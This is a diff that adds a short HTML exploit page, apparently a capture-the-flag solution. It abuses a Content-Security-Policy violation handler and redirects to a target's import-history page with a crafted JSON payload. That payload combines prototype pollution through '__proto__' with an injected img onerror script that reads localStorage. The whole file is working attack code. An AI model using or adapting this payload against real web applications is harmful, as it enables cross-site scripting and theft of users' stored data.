@@ -1,0 +1,22 @@
+<head>
+	<meta http-equiv="Content-Security-Policy" content="frame-src 'self' http://127.0.0.1:1234/http:;">
+</head>
+<script>
+window.onsecuritypolicyviolation = () => {
+	PAYLOAD = encodeURIComponent(JSON.stringify({
+		"0": {
+			["__proto__"]: {
+				"1": {
+					"length": "<img src=x onerror=\"alert(localStorage.blockHistory)\">",
+					"location": {},
+					"name":"lol",
+					"origin": parent.parent.SERVER
+				}
+			}
+		}
+	}))
+	location = `${parent.parent.SERVER}/import-history.html?history=${PAYLOAD}`
+}
+</script>
+<iframe></iframe>
+<iframe></iframe>
